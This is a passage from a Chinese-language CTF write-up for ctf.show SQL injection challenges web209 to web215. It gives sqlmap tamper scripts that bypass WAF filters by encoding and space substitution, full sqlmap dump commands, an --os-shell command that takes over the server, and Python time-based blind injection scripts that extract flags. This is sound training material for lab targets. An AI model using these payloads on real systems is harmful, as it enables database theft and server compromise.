</span></span><span class="line"><span class="ln">34</span><span class="cl">                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;=&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;like&#39;</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></div><p>其实也不用写这么复杂</p>
<p>直接这样也ok的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34; like &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x09</span><span class="p">))</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump
</code></pre><h4 id="web210">web210<a hidden class="anchor" aria-hidden="true" href="#web210">#</a></h4>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
返回逻辑

//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
      
</code></pre><p>这题会对查询的字符进行两次的base64解密和两次的反转</p>
<p>那我们只需要修改tamper，使传入的payload进行两次base64加密即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">rev1</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">encode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">rev2</span> <span class="o">=</span> <span class="n">encode1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">encode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">return</span> <span class="n">encode2</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump
</code></pre><h4 id="web211">web211<a hidden class="anchor" aria-hidden="true" href="#web211">#</a></h4>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
返回逻辑

//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match(&#39;/ /&#39;, $str);
}
</code></pre><p>增加了空格waf</p>
<p>问题不大</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">	
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">payload0</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x09</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">rev1</span> <span class="o">=</span> <span class="n">payload0</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">encode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">rev2</span> <span class="o">=</span> <span class="n">encode1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">encode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">return</span> <span class="n">encode2</span>
</span></span></code></pre></div><p>payload</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump
</code></pre><h4 id="web212">web212<a hidden class="anchor" aria-hidden="true" href="#web212">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">//</span><span class="n">拼接sql语句查找指定ID用户</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="err">$</span><span class="nb">id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 0,1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">//</span><span class="n">对查询字符进行解密</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="n">function</span> <span class="n">decode</span><span class="p">(</span><span class="err">$</span><span class="nb">id</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">strrev</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">strrev</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="err">$</span><span class="nb">id</span><span class="p">))));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">function</span> <span class="n">waf</span><span class="p">(</span><span class="err">$</span><span class="nb">str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*/&#39;</span><span class="p">,</span> <span class="err">$</span><span class="nb">str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>waf增加了*</p>
<p>但是不影响上一题的tamper</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump
</code></pre><h4 id="web213">web213<a hidden class="anchor" aria-hidden="true" href="#web213">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 0,1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">//对查询字符进行解密
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">))));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*/&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>根据提示，用&ndash;os-shell拿到shell读flag</p>
<p>其他跟上题一样</p>
<p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;&#34; --referer=ctf.show --safe-url=&#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 --os-shell
</code></pre><p><img alt="image-20250213223852147" loading="lazy" src="../assets/image-20250213223852147.png"></p>
<h4 id="时间盲注">时间盲注<a hidden class="anchor" aria-hidden="true" href="#时间盲注">#</a></h4>
<h4 id="web214">web214<a hidden class="anchor" aria-hidden="true" href="#web214">#</a></h4>
<p><img alt="image-20250214112011874" loading="lazy" src="../assets/image-20250214112011874.png"></p>
<p>这道题没给出注入点</p>
<p><img alt="image-20250214114945157" loading="lazy" src="../assets/image-20250214114945157.png"></p>
<p>主页找到select.js中，测试后发现ip为注入点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flaga from ctfshow_flagx&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web215">web215<a hidden class="anchor" aria-hidden="true" href="#web215">#</a></h4>
<p><img alt="image-20250214121007384" loading="lazy" src="../assets/image-20250214121007384.png"></p>
<p>上题脚本改一改</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># payload = &#34;select flaga from ctfshow_flagx&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1&#39; or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
